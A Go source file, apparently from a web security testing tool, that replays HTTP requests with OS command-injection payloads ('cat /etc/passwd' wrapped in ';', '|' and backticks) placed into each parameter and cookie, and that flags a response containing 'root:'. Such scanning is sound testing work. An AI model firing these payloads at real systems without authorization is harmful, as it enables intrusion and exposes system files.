package repeatReqHandlers

import (
	"bytes"
	"fmt"
	"net/http"
	"strings"
)

var tokens = []string{
	";cat /etc/passwd;",
	"|cat /etc/passwd|",
	"`cat /etc/passwd`",
}

const vulnerabilityMarker = "root:"

func TryVulnerabilities(respWriter http.ResponseWriter, request *http.Request) {
	req := getReqFromParam(respWriter, request)

	var params []Param
	if req.Request[:3] == "GET" {
		params = findGETParams(req.Request)
	} else if req.Request[:4] == "POST" {
		params = findPOSTParams(req.Request)
	}

	params = append(params, tryCookie(req.Request)...)
	origRequest := req.Request
	var vulnerabilities string
	for _, param := range params {
		for _, token := range tokens {
			req.Request = strings.Replace(origRequest, param.serialize(), param.fakeReplaceValue(token), 1)
			resp := ExecReq(req)
			buf := new(bytes.Buffer)
			buf.ReadFrom(resp.Body)
			respStr := buf.String()
			if strings.Contains(respStr, vulnerabilityMarker) {
				param.vulnerable = true
				vulnerabilities += fmt.Sprintf("Found vulnerable %s {%s} with exploit {%s}\n", param.class, param.key, token)
			}
		}
	}

	respWriter.Write([]byte(vulnerabilities))
}
